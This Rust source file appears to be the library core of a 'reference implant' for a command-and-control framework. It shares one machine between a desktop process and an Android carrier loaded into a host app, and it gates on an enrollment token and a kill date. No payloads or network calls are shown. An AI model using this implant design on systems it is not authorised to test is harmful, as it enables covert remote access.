// The Rust reference implant's library core (architecture.md Sec 12.2).
// The whole machine lives here so it has two entries that share it: the
// standalone process (src/main.rs, the desktop legs) and the Android
// carrier shell (carrier/, the cdylib android.app.NativeActivity loads
// in-process). One core, two shells, no protocol knowledge in either.

mod baked;
mod channel;
mod diag;
mod enroll;
mod envelope;
mod error;
mod handlers;
mod outbox;
mod plugins;
mod profile;
mod run;
mod sensitive;
mod session;
mod transport;
mod trust;
mod verify;
mod wire;

// The gates both entries share: load the profile (the fielded shape runs
// entirely off the bake; the dev shape, an empty bake, runs from ROD_*
// environment variables), refuse an empty credential and a passed kill
// date. Split from the entries because a library loaded into another
// process must never exit it -- the caller decides what an end state means.
fn runnable_profile() -> Option<profile::Profile> {
    let Some(profile) =
        profile::Profile::from_baked(baked::PROFILE).or_else(profile::Profile::from_env)
    else {
        crate::diag!(
            "this build carries no baked profile and no ROD_* environment; nothing to run"
        );
        return None;
    };
    if profile.token.is_empty() {
        crate::diag!("no enrollment credential (bake or ROD_DEPLOY_TOKEN)");
        return None;
    }
    if profile.kill_date_passed() {
        crate::diag!("kill date has passed; refusing to run");
        return None;
    }
    Some(profile)
}

/// The standalone process entry's answer: the exit code the binary maps
/// onto `std::process::exit`.
pub fn standalone_main() -> i32 {
    let Some(profile) = runnable_profile() else {
        return 2;
    };
    match run::run(&profile) {
        run::Exit::Terminated(code) => code as i32,
        run::Exit::NoFront => 1,
    }
}

/// The in-process carrier entry: the same gates and the same machine, but
/// the end states end the thread, not the process -- the host (the
/// Android activity, say) owns the process lifetime and may restart the
/// loop by launching the carrier again.
pub fn carrier_run() {
    let Some(profile) = runnable_profile() else {
        return;
    };
    match run::run(&profile) {
        run::Exit::Terminated(code) => {
            crate::diag!("run terminated ({code}); the carrier thread ends");
        }
        run::Exit::NoFront => {
            crate::diag!("no front answered; the carrier thread ends");
        }
    }
}
